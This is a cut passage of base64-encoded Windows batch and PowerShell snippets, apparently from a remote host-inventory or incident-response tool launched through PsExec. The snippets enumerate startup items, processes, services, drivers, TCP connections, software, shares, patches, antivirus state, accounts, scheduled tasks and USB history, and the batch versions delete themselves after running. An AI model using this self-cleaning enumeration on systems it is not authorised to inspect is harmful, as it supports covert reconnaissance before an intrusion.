LUluY2x1ZGUgKi5leGUgLUV4Y2x1ZGUgIkFwcGxpY2F0aW9uIERhdGEiIDI+JG51bGwgfCAKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLm5hbWUrIiwiKyRfLkRpcmVjdG9yeW5hbWV9fApPdXQtZmlsZSAiQzpcVXNlckV4ZVNlYXJjaDM5MjEyNTI4MSIKUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAokU3RhcnRVcFByb2dyYW1zQ29kZV9CQVQgPSBAJwpAZWNobyBvZmYKSUYgRVhJU1QgIkM6XFN0YXJ0VXBQcm9ncmFtczM5MjEyNTI4MSIgREVMICJDOlxTdGFydFVwUHJvZ3JhbXMzOTIxMjUyODEiCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KZm9yIC9GICJ0b2tlbnM9MS0yKiBkZWxpbXM9PSIgJSVBIGluICgnd21pYyBzdGFydHVwIGdldCBjb21tYW5kXix1c2VyXixkZXNjcmlwdGlvbl4sbG9jYXRpb24gL2Zvcm1hdDpsaXN0IF58ZmluZHN0ciAuJykgRE8gKAoJc2V0IC9hIHZhcj0hdmFyISsxCglzZXQgc3RyPSUlQgoJSUYgIXZhciE9PTEgc2V0IENvbW1hbmQ9IXN0cjp+MCwtMSEKCUlGICF2YXIhPT0yIHNldCBEZXNjcmlwdGlvbj0hc3RyOn4wLC0xIQoJSUYgIXZhciE9PTMgU2V0IExvY2F0aW9uPSFzdHI6fjAsLTEhCglJRiAhdmFyIT09NCAoCgkJc2V0IFVzZXI9IXN0cjp+MCwtMSEKCQlzZXQgQ29tbWFuZD0hQ29tbWFuZDosPSEKCQlJRiAiIUNvbW1hbmQhIj09Iiw9IiBzZXQgQ29tbWFuZD0KCQlzZXQgRGVzY3JpcHRpb249IURlc2NyaXB0aW9uOiw9IQoJCUlGICIhRGVzY3JpcHRpb24hIj09Iiw9IiBzZXQgRGVzY3JpcHRpb249CgkJZWNobyAlQ09NUFVURVJOQU1FJSwhQ29tbWFuZCEsIURlc2NyaXB0aW9uISwhTG9jYXRpb24hLCFVc2VyISA+PiAiQzpcU3RhcnRVcFByb2dyYW1zMzkyMTI1MjgxIgoJCXNldCAvYSB2YXI9MAoJKQopIAooZ290bykgMj5udWwgJiBkZWwgIiV+ZjAiCidACiRTdGFydFVwUHJvZ3JhbXNDb2RlX1BTMSA9IEAnCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSBTdG9wCmlmIChUZXN0LVBhdGggIkM6XFN0YXJ0VXBQcm9ncmFtczM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcU3RhcnRVcFByb2dyYW1zMzkyMTI1MjgxIn0KdHJ5ewpHZXQtV21pT2JqZWN0IFdpbjMyX3N0YXJ0dXBjb21tYW5kIHwKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLmNvbW1hbmQrIiwiKyRfLmRlc2NyaXB0aW9uKyIsIiskXy5sb2NhdGlvbisiLCIrJF8udXNlcn18Ck91dC1maWxlICJDOlxTdGFydFVwUHJvZ3JhbXMzOTIxMjUyODEiCn0gY2F0Y2gge2NvbnRpbnVlfQpSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiCidACiRSdW5uaW5nUHJvY3NDb2RlX0JBVCA9IEAnCkBlY2hvIG9mZgpJRiBFWElTVCAiQzpcUnVubmluZ1Byb2NzMzkyMTI1MjgxIiBERUwgIkM6XFJ1bm5pbmdQcm9jczM5MjEyNTI4MSIKd21pYyBwcm9jZXNzIGdldCBuYW1lLGV4ZWN1dGFibGVwYXRoIC9GT1JNQVQ6Y3N2IHxmaW5kc3RyIC92IE5vZGUgPj4gIkM6XFJ1bm5pbmdQcm9jczM5MjEyNTI4MSIKKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIgonQAokUnVubmluZ1Byb2NzQ29kZV9QUzEgPSBAJwokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gU3RvcAppZiAoVGVzdC1QYXRoICJDOlxSdW5uaW5nUHJvY3MzOTIxMjUyODEiKXtSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFJ1bm5pbmdQcm9jczM5MjEyNTI4MSJ9CnRyeXsKR2V0LVdtaU9iamVjdCBXaW4zMl9wcm9jZXNzIHwKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLkV4ZWN1dGFibGVQYXRoKyIsIiskXy5OYW1lfXwKT3V0LWZpbGUgIkM6XFJ1bm5pbmdQcm9jczM5MjEyNTI4MSIKfSBjYXRjaCB7Y29udGludWV9ClJlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcUFNFeGVjU2hlbGxDb2RlLnBzMSIKJ0AKJFF1ZXJ5RHJpdmVyc0NvZGVfQkFUID0gQCcKQGVjaG8gb2ZmCklGIEVYSVNUICJDOlxEcml2ZXJzMzkyMTI1MjgxIiBERUwgIkM6XERyaXZlcnMzOTIxMjUyODEiCndtaWMgc3lzZHJpdmVyIGdldCBEaXNwbGF5TmFtZSwgTmFtZSwgU3RhdGUsIFN0YXR1cywgU3RhcnRlZCwgRGVzY3JpcHRpb24gL2Zvcm1hdDpjc3YgfGZpbmRzdHIgL3YgTm9kZSA+PiAiQzpcRHJpdmVyczM5MjEyNTI4MSIKKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIgonQAokUXVlcnlEcml2ZXJzQ29kZV9QUzEgPSBAJyAKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9IFN0b3AKaWYgKFRlc3QtUGF0aCAiQzpcRHJpdmVyczM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcRHJpdmVyczM5MjEyNTI4MSJ9CnRyeXsKR2V0LVdtaU9iamVjdCBXaW4zMl9zeXN0ZW1kcml2ZXIgfCAKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLkRlc2NyaXB0aW9uKyIsIiskXy5EaXNwbGF5TmFtZSsiLCIrJF8uTmFtZSsiLCIrJF8uc3RhcnRlZCsiLCIrJF8uc3RhdGUrIiwiKyRfLnN0YXR1c318Ck91dC1maWxlICJDOlxEcml2ZXJzMzkyMTI1MjgxIgp9IGNhdGNoIHtjb250aW51ZX0KUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAokUXVlcnlTZXJ2aWNlc0NvZGVfQkFUID0gQCcKQGVjaG8gb2ZmCklGIEVYSVNUICJDOlxTZXJ2aWNlczM5MjEyNTI4MSIgREVMICJDOlxTZXJ2aWNlczM5MjEyNTI4MSIKd21pYyBzZXJ2aWNlIGdldCBOYW1lLFN0YXJ0TW9kZSxTdGF0ZSxTdGF0dXMgL2Zvcm1hdDpjc3YgfGZpbmRzdHIgL3YgTm9kZSA+PiAiQzpcU2VydmljZXMzOTIxMjUyODEiCihnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCIKJ0AKJFF1ZXJ5U2VydmljZXNDb2RlX1BTMSA9IEAnCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSBTdG9wCmlmIChUZXN0LVBhdGggIkM6XFNlcnZpY2VzMzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxTZXJ2aWNlczM5MjEyNTI4MSJ9CnRyeXsKR2V0LVdtaU9iamVjdCBXaW4zMl9zZXJ2aWNlIHwKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLk5hbWUrIiwiKyRfLlN0YXJ0TW9kZSsiLCIrJF8uc3RhdGUrIiwiKyRfLnN0YXR1c318Ck91dC1maWxlICJDOlxTZXJ2aWNlczM5MjEyNTI4MSIKfSBjYXRjaCB7Y29udGludWV9ClJlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcUFNFeGVjU2hlbGxDb2RlLnBzMSIKJ0AKJE5ldHN0YXRDb2RlX0JBVCA9IEAnCkBlY2hvIG9mZgpJRiBFWElTVCAiQzpcTmV0c3RhdDM5MjEyNTI4MSIgREVMICJDOlxOZXRzdGF0MzkyMTI1MjgxIgpmb3IgL0YgInRva2Vucz0xLTcgZGVsaW1zPTogIiAlJUEgaW4gKCduZXRzdGF0IC1hbm8gLXAgVENQIF58ZmluZHN0ciBUQ1AnKSBkbyAoCgl3bWljIHByb2Nlc3Mgd2hlcmUgIlByb2Nlc3NJRD0lJUciIGdldCBuYW1lIDI+bnVsfGZpbmRzdHIgL3YgTmFtZSA+IHRlbXAxODUyMzY0OTcKCXNldCAvcCBQUk9DPTx0ZW1wMTg1MjM2NDk3CglzZXRsb2NhbCBFTkFCTEVERUxBWUVERVhQQU5TSU9OCgllY2hvICVDT01QVVRFUk5BTUUlLCUlQiwlJUMsJSVELCUlRSwlJUYsIVBST0MhLCUlRyA+PiAiQzpcTmV0c3RhdDM5MjEyNTI4MSIKCWVuZGxvY2FsCiAJZGVsIHRlbXAxODUyMzY0OTcKKQooZ290bykgMj5udWwgJiBkZWwgIiV+ZjAiCidACiROZXRzdGF0Q29kZV9QUzEgPSBAJwokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gU3RvcAppZiAoVGVzdC1QYXRoICJDOlxOZXRzdGF0MzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxOZXRzdGF0MzkyMTI1MjgxIn0KdHJ5ewoobmV0c3RhdCAtYW5vIHwgU2VsZWN0LVN0cmluZyAtUGF0dGVybiAnXHMrKFRDUCknIHwgCkZvckVhY2gtT2JqZWN0IHskZW52OkNPTVBVVEVSTkFNRSArICgoKCRfIC1yZXBsYWNlICdccysnLCAnLCcpIC1yZXBsYWNlICdcWzo6XF0nLCAnJykgLXJlcGxhY2UgJzonLCAnLCcpfSkgfCAKJXsgJF8uU3BsaXQoJywnKVswXSArIiwiKyAkXy5TcGxpdCgnLCcpWzJdICsiLCIrIAokXy5TcGxpdCgnLCcpWzNdICsiLCIrICRfLlNwbGl0KCcsJylbNF0gKyIsIisgJF8uU3BsaXQoJywnKVs1XSArIiwiKwokXy5TcGxpdCgnLCcpWzZdICsiLCIrICQoR2V0LVByb2Nlc3MgLUlkICQoJF8uU3BsaXQoJywnKVs3XSkpLk5hbWUgKyIsIisgJF8uU3BsaXQoJywnKVs3XSB9fApPdXQtZmlsZSAiQzpcTmV0c3RhdDM5MjEyNTI4MSIKfSBjYXRjaCB7Y29udGludWV9ClJlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcUFNFeGVjU2hlbGxDb2RlLnBzMSIKJ0AKJEluc3RhbGxlZFNvZnR3YXJlQ29kZV9CQVQgPSBAJwpAZWNobyBvZmYKSUYgRVhJU1QgIkM6XEluc3RhbGxlZFNvZnR3YXJlMzkyMTI1MjgxIiBERUwgIkM6XEluc3RhbGxlZFNvZnR3YXJlMzkyMTI1MjgxIgpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uCmZvciAvRiAidG9rZW5zPTEtMiogZGVsaW1zPT0iICUlQSBpbiAoJ3dtaWMgcHJvZHVjdCBnZXQgTmFtZV4sIFZlbmRvcl4sIFZlcnNpb25eLCBJbnN0YWxsRGF0ZV4sIEluc3RhbGxMb2NhdGlvbiAvZm9ybWF0Okxpc3QgXnxmaW5kc3RyIC4nKSBETyAoCglzZXQgL2EgdmFyPSF2YXIhKzEKCXNldCBzdHI9JSVCCglJRiAhdmFyIT09MSBzZXQgSW5zdGFsbERhdGU9IXN0cjp+MCwtMSEKCUlGICF2YXIhPT0yIHNldCBJbnN0YWxsTG9jYXRpb249IXN0cjp+MCwtMSEKCUlGICF2YXIhPT0zIFNldCBOYW1lPSFzdHI6fjAsLTEhCglJRiAhdmFyIT09NCBzZXQgVmVuZG9yPSFzdHI6fjAsLTEhCglJRiAhdmFyIT09NSAoCgkJc2V0IFZlcnNpb249IXN0cjp+MCwtMSEKCQlzZXQgTmFtZT0hTmFtZTosPSEKCQlJRiAiIU5hbWUhIj09Iiw9IiBzZXQgTmFtZT0KCQlzZXQgVmVuZG9yPSFWZW5kb3I6LD0hCgkJSUYgIiFWZW5kb3IhIj09Iiw9IiBzZXQgVmVuZG9yPQoJCWVjaG8gJUNPTVBVVEVSTkFNRSUsIUluc3RhbGxEYXRlISwhSW5zdGFsbExvY2F0aW9uISwhTmFtZSEsIVZlbmRvciEsIVZlcnNpb24hID4+ICJDOlxJbnN0YWxsZWRTb2Z0d2FyZTM5MjEyNTI4MSIKCQlzZXQgL2EgdmFyPTAKCSkKKSAKZW5kbG9jYWwgCihnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCIKJ0AKJEluc3RhbGxlZFNvZnR3YXJlQ29kZV9QUzEgPSBAJwokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gU3RvcAppZiAoVGVzdC1QYXRoICJDOlxJbnN0YWxsZWRTb2Z0d2FyZTM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcSW5zdGFsbGVkU29mdHdhcmUzOTIxMjUyODEifQp0cnl7CkdldC1XbWlPYmplY3Qgd2luMzJfcHJvZHVjdHwKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLkluc3RhbGxEYXRlKyIsIiskXy5JbnN0YWxsTG9jYXRpb24rIiwiKygkXy5OYW1lIC1yZXBsYWNlICcsJywgJycpKyIsIisoJF8uVmVuZG9yIC1yZXBsYWNlICcsJywgJycpKyIsIiskXy52ZXJzaW9ufXwKT3V0LWZpbGUgIkM6XEluc3RhbGxlZFNvZnR3YXJlMzkyMTI1MjgxIgp9IGNhdGNoIHtjb250aW51ZX0KUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAokU2hhcmVzQ29kZV9CQVQgPSBAJwpAZWNobyBvZmYKSUYgRVhJU1QgIkM6XE5ldHdvcmtTaGFyZXMzOTIxMjUyODEiIERFTCAiQzpcTmV0d29ya1NoYXJlczM5MjEyNTI4MSIKd21pYyBzaGFyZSBsaXN0IGJyaWVmIC9mb3JtYXQ6Y3N2IHxmaW5kc3RyIC92IE5vZGUgPj4gIkM6XE5ldHdvcmtTaGFyZXMzOTIxMjUyODEiCihnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCIKJ0AKJFNoYXJlc0NvZGVfUFMxID0gQCcKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9IFN0b3AKaWYgKFRlc3QtUGF0aCAiQzpcTmV0d29ya1NoYXJlczM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcTmV0d29ya1NoYXJlczM5MjEyNTI4MSJ9CnRyeXsKR2V0LVdtaU9iamVjdCB3aW4zMl9zaGFyZSB8CmZvcmVhY2ggeyRlbnY6Q09NUFVURVJOQU1FKyIsIiskXy5kZXNjcmlwdGlvbisiLCIrJF8uTmFtZSsiLCIrJF8uUGF0aH18Ck91dC1maWxlICJDOlxOZXR3b3JrU2hhcmVzMzkyMTI1MjgxIgp9IGNhdGNoIHtjb250aW51ZX0KUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAokSG90Rml4Q29kZV9CQVQgPSBAJwpAZWNobyBvZmYKSUYgRVhJU1QgIkM6XEhvdEZpeERhdGEzOTIxMjUyODEiIERFTCAiQzpcSG90Rml4RGF0YTM5MjEyNTI4MSIKd21pYyBxZmUgZ2V0IERlc2NyaXB0aW9uLEhvdEZpeElELEluc3RhbGxlZEJ5LEluc3RhbGxlZE9uIC9mb3JtYXQ6Y3N2IHxmaW5kc3RyIC92IC9jOk5vZGUgL2M6IkZpbGUgMSIgPj4gIkM6XEhvdEZpeERhdGEzOTIxMjUyODEiCihnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCIKJ0AKJEhvdEZpeENvZGVfUFMxID0gQCcKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9IFN0b3AKaWYgKFRlc3QtUGF0aCAiQzpcSG90Rml4RGF0YTM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcSG90Rml4RGF0YTM5MjEyNTI4MSJ9CnRyeXsKR2V0LUhvdGZpeHwKZm9yZWFjaCB7JGVudjpDT01QVVRFUk5BTUUrIiwiKyRfLkRlc2NyaXB0aW9uKyIsIiskXy5Ib3RGaXhJRCsiLCIrJF8uSW5zdGFsbGVkQnkrIiwiKyRfLkluc3RhbGxlZE9ufXwKT3V0LWZpbGUgIkM6XEhvdEZpeERhdGEzOTIxMjUyODEiCn0gY2F0Y2gge2NvbnRpbnVlfQpSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiCidACiRBbnRpdmlydXNTdGF0dXNDb2RlX0JBVCA9IEAnCkBlY2hvIG9mZgpJRiBFWElTVCAiQzpcQW50aXZpcnVzU3RhdHVzMzkyMTI1MjgxIiBERUwgIkM6XEFudGl2aXJ1c1N0YXR1czM5MjEyNTI4MSIKV01JQyAvTmFtZXNwYWNlOlxccm9vdFxTZWN1cml0eUNlbnRlciBQYXRoIEFudGlWaXJ1c1Byb2R1Y3QgZ2V0IGRpc3BsYXlOYW1lLHZlcnNpb25OdW1iZXIsb25BY2Nlc3NTY2FubmluZ0VuYWJsZWQscHJvZHVjdFVwdG9EYXRlIC9mb3JtYXQ6Y3N2IHxmaW5kc3RyIC92IE5vZGUgPj4gIkM6XEFudGl2aXJ1c1N0YXR1czM5MjEyNTI4MSIKKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIgonQAokQW50aXZpcnVzU3RhdHVzQ29kZV9QUzEgPSBAJwokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gU3RvcAppZiAoVGVzdC1QYXRoICJDOlxBbnRpdmlydXNTdGF0dXMzOTIxMjUyODEiKXtSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XEFudGl2aXJ1c1N0YXR1czM5MjEyNTI4MSJ9CnRyeXsKR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3RcU2VjdXJpdHlDZW50ZXIyIC1DbGFzcyBBbnRpVmlydXNQcm9kdWN0IHwlewoJaWYoLW5vdCAkXy52ZXJzaW9uTnVtYmVyKXsKCQkkdmVyc2lvbiA9IChHZXQtQ29tbWFuZCAkXy5wYXRoVG9TaWduZWRQcm9kdWN0RXhlLnRvc3RyaW5nKCkpLkZpbGVWZXJzaW9uSW5mby5Qcm9kdWN0VmVyc2lvbgoJCWlmKC1ub3QgJHZlcnNpb24pewoJCSR2ZXJzaW9uID0gKEdldC1Db21tYW5kICRfLnBhdGhUb1NpZ25lZFJlcG9ydGluZ0V4ZS50b3N0cmluZygpKS5GaWxlVmVyc2lvbkluZm8uUHJvZHVjdFZlcnNpb24KCQl9Cgl9IGVsc2UgeyR2ZXJzaW9uID0gJF8udmVyc2lvbk51bWJlcn0KCSRlbnY6Q09NUFVURVJOQU1FKyIsIiskXy5kaXNwbGF5TmFtZSsiLCIrJF8ucHJvZHVjdHN0YXRlKyIsIiskdmVyc2lvbgoJfSB8ICV7CgkJJFByb2R1Y3RDb2RlPSRfLlNwbGl0KCcsJylbMl0KCQkkcnRzdGF0dXMgPSAoW2NvbnZlcnRdOjp0b0ludDMyKCIkUHJvZHVjdENvZGUiKS50b3N0cmluZygiWDYiKSkuc3Vic3RyaW5nKDIsIDIpCgkJJGRlZnN0YXR1cyA9IChbY29udmVydF06OnRvSW50MzIoIiRQcm9kdWN0Q29kZSIpLnRvc3RyaW5nKCJYNiIpKS5zdWJzdHJpbmcoNCwgMikKCQlpZiAoJHJ0c3RhdHVzIC1lcSAiMTAiKXskcnRzdGF0dXMgPSAkdHJ1ZX0KCQllbHNlIHskcnRzdGF0dXMgPSAkZmFsc2V9CgkJaWYgKCRkZWZzdGF0dXMgLWVxICIwMCIpeyRkZWZzdGF0dXM9JHRydWV9CgkJZWxzZXskZGVmc3RhdHVzPSRmYWxzZX0KCQkkXy5TcGxpdCgnLCcpWzBdKyIsIiskXy5TcGxpdCgnLCcpWzFdKyIsIiskcnRzdGF0dXMrIiwiKyRkZWZzdGF0dXMrIiwiKyRfLlNwbGl0KCcsJylbM10KCX18T3V0LWZpbGUgIkM6XEFudGl2aXJ1c1N0YXR1czM5MjEyNTI4MSIKfSBjYXRjaCB7Y29udGludWV9ClJlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcUFNFeGVjU2hlbGxDb2RlLnBzMSIKJ0AKJEF1dG9SdW5EaXNhYmxlQ29kZV9CQVQgPSBAJwpAZWNobyBvZmYKSUYgRVhJU1QgIkM6XEF1dG9SdW5EaXNhYmxlMzkyMTI1MjgxIiBERUwgIkM6XEF1dG9SdW5EaXNhYmxlMzkyMTI1MjgxIgpmb3IgL0YgInRva2Vucz0xLTMiICUlQSBpbiAoJ3JlZyBxdWVyeSBIS0VZX0xPQ0FMX01BQ0hJTkVcc29mdHdhcmVcbWljcm9zb2Z0XHdpbmRvd3NcY3VycmVudHZlcnNpb25ccG9saWNpZXNcZXhwbG9yZXIgXnxmaW5kc3RyIE5vRHJpdmVUeXBlQXV0b1J1bicpIGRvICgKCUlGICUlQyBFUVUgMHhGRiAoZWNobyAlQ09NUFVURVJOQU1FJSxUUlVFICkgIEVMU0UgZWNobyAlQ09NUFVURVJOQU1FJSxGQUxTRQopID4+ICJDOlxBdXRvUnVuRGlzYWJsZTM5MjEyNTI4MSIKKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIgonQAokQXV0b1J1bkRpc2FibGVDb2RlX1BTMT1AJwokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gU3RvcAppZiAoVGVzdC1QYXRoICJDOlxBdXRvUnVuRGlzYWJsZTM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcQXV0b1J1bkRpc2FibGUzOTIxMjUyODEifQp0cnl7CiROb0F1dG9SdW4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOnNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXHBvbGljaWVzXGV4cGxvcmVyIC1OYW1lIE5vQXV0b1J1bikuTm9BdXRvUnVuCmlmKCROb0F1dG9SdW4peyRlbnY6Q09NUFVURVJOQU1FKyIsVFJVRSJ8T3V0LWZpbGUgIkM6XEF1dG9SdW5EaXNhYmxlMzkyMTI1MjgxIn0KZWxzZXskZW52OkNPTVBVVEVSTkFNRSsiLEZBTFNFInxPdXQtZmlsZSAiQzpcQXV0b1J1bkRpc2FibGUzOTIxMjUyODEifQp9IGNhdGNoIHtjb250aW51ZX0KUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAokTG9jYWxBY2NvdW50c0NvZGVfQkFUID0gQCcKQGVjaG8gb2ZmCklGIEVYSVNUICJDOlxMb2NhbEFjY291bnRzMzkyMTI1MjgxIiBERUwgIkM6XExvY2FsQWNjb3VudHMzOTIxMjUyODEiCmZvciAvRiAidG9rZW5zPSoiICUlRyBpbiAoJ25ldCB1c2Vyc158ZmluZHN0ciAvdiAvYzoiVXNlciBhY2NvdW50cyIgL2M6ImNvbW1hbmQgY29tcGxldGVkIiAvYzoiLS0tLSInKSBkbyBARm9yICUlVSBpbiAoJSVHKSBETyAoCglzZXRsb2NhbCBFTkFCTEVERUxBWUVERVhQQU5TSU9OCglmb3IgL2YgICJ0b2tlbnM9MS0yKiIgJSVDIElOICgnbmV0IHVzZXIgIiUlVSIgXnxmaW5kc3RyIC9jOiJBY2NvdW50IGFjdGl2ZSIgL2M6Ikxhc3QgbG9nb24iJykgRE8gKAoJCXNldCAvYSB2YXI9IXZhciErMQoJCWlmICF2YXIhPT0xICgKCQkJc2V0IGRhdGE9JSVFCgkJKSBFTFNFICgKCQkJZWNobyAlQ09NUFVURVJOQU1FJSwlJVUsIWRhdGEhLCUlRQoJCSkKCSkyPm51bAoJZW5kbG9jYWwKKSA+PiAiQzpcTG9jYWxBY2NvdW50czM5MjEyNTI4MSIKKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIgonQAokTG9jYWxBY2NvdW50c0NvZGVfUFMxPUAnCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSBTdG9wCmlmIChUZXN0LVBhdGggIkM6XExvY2FsQWNjb3VudHMzOTIxMjUyODEiKXtSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XExvY2FsQWNjb3VudHMzOTIxMjUyODEifQokYWRzaSA9IFtBRFNJXSJXaW5OVDovLyRlbnY6Q09NUFVURVJOQU1FIgokVXNlcnMgPSAkYWRzaS5DaGlsZHJlbiAgfCB3aGVyZSB7JF8uU2NoZW1hQ2xhc3NOYW1lICAtZXEgJ3VzZXInfQokVXNlcnN8JXsKCSRhY3RpdmUgPSBOZXQgdXNlciAkXy5uYW1lfHNlbGVjdC1zdHJpbmcgIkFjY291bnQgYWN0aXZlIgoJaWYoJGFjdGl2ZXxTZWxlY3QtU3RyaW5nICJObyIpeyRhY3RpdmU9Ik5vIn0KCWVsc2VpZigkYWN0aXZlfFNlbGVjdC1TdHJpbmcgIlllcyIpeyRhY3RpdmU9IlllcyJ9Cgl0cnl7CgkJJGxvZ2luPSIsIisoJF8uTGFzdExvZ2luKS5WYWx1ZQoJfSBjYXRjaCB7CiAgICAgICAgJGxvZ2luPSIsTmV2ZXIiCiAgICB9CgkkZW52OkNPTVBVVEVSTkFNRSsiLCIrJF8uTmFtZSsiLCIrJGFjdGl2ZSskbG9naW4KfXxPdXQtZmlsZSAiQzpcTG9jYWxBY2NvdW50czM5MjEyNTI4MSIKUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIgonQAokU2NoZWR1bGVkVGFza3NDb2RlX0JBVCA9IEAnCkBlY2hvIG9mZgpJRiBFWElTVCAiQzpcU2NoZWR1bGVkVGFza3MzOTIxMjUyODEiIERFTCAiQzpcU2NoZWR1bGVkVGFza3MzOTIxMjUyODEiCndtaWMgam9iIGxpc3QgYnJpZWYgL2Zvcm1hdDpjc3YgMj5udWx8ZmluZHN0ciAvdiBOb2RlID4+ICJDOlxTY2hlZHVsZWRUYXNrczM5MjEyNTI4MSIKKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIgonQAokU2NoZWR1bGVkVGFza3NDb2RlX1BTMSA9IEAnCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSBTdG9wCmlmIChUZXN0LVBhdGggIkM6XFNjaGVkdWxlZFRhc2tzMzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxTY2hlZHVsZWRUYXNrczM5MjEyNTI4MSJ9CnRyeXsKR2V0LVdtaU9iamVjdCB3aW4zMl9zY2hlZHVsZWRqb2IgfApmb3JlYWNoIHskZW52OkNPTVBVVEVSTkFNRSsiLCIrJF8uY29tbWFuZCsiLCIrJF8uSm9iSWQrIiwiKyRfLk5hbWUrIiwiKyRfLk93bmVyKyIsIiskXy5Qcmlvcml0eX18Ck91dC1maWxlICJDOlxTY2hlZHVsZWRUYXNrczM5MjEyNTI4MSIKfSBjYXRjaCB7Y29udGludWV9ClJlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcUFNFeGVjU2hlbGxDb2RlLnBzMSIKJ0AKJFVTQl9FbnVtZXJhdGlvbkNvZGVfQkFUID0gQCcKQGVjaG8gb2ZmCklGIEVYSVNUICJDOlxVU0JfRW51bWVyYXRpb24zOTIxMjUyODEiIERFTCAiQzpcVVNCX0VudW1lcmF0aW9uMzkyMTI1MjgxIgpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uCmZvciAvZiAlJUEgaW4gKCdyZWcgcXVlcnkgaGtsbVxzeXN0ZW1cY3VycmVudGNvbnRyb2xzZXRcZW51bVx1c2InKSBETyAoCQoJZm9yIC9mICUlQiBJTiAoJ3JlZyBxdWVyeSAiJSVBIicpIERPICgKCQlmb3IgL2YgICJ0b2tlbnM9MS0yKiIgJSVDIElOICgncmVnIHF1ZXJ5ICIlJUIiIC92IEZyaWVuZGx5TmFtZScpIERPICgKCQkJc2V0IEZyaWVuZGx5TmFtZT0lJUUKCQkJSUYgIiFGcmllbmRseU5hbWUhIiBORVEgIiIgc2V0IEZyaWVuZGx5TmFtZT0hRnJpZW5kbHlOYW1lOiw9IQoJCSkyPm51bAoJCWZvciAvZiAgInRva2Vucz0xLTIqIiAlJUMgSU4gKCdyZWcgcXVlcnkgIiUlQiIgL3YgRGV2aWNlRGVzYycpIERPICgJCgkJCXNldCBEZXZpY2VEZXNjcj0lJUUKCQkJSUYgIiFEZXZpY2VEZXNjciEiIE5FUSAiIiBzZXQgRGV2aWNlRGVzY3I9IURldmljZURlc2NyOiw9IQoJCSkyPm51bAoJCUlGICIlJUIiIE5FUSAiIiAoCgkJCUlGICIhRGV2aWNlRGVzY3IhIiBORVEgIiIgKAoJCQkJZWNobyAlQ09NUFVURVJOQU1FJSwhRGV2aWNlRGVzY3IhLCFGcmllbmRseU5hbWUhLCUlQiA+PiAiQzpcVVNCX0VudW1lcmF0aW9uMzkyMTI1MjgxIgoJCQkpIEVMU0UgKAoJCQkJSUYgIiFGcmllbmRseU5hbWUhIiBORVEgIiIgKAoJCQkJCWVjaG8gJUNPTVBVVEVSTkFNRSUsIURldmljZURlc2NyISwhRnJpZW5kbHlOYW1lISwlJUIgPj4gIkM6XFVTQl9FbnVt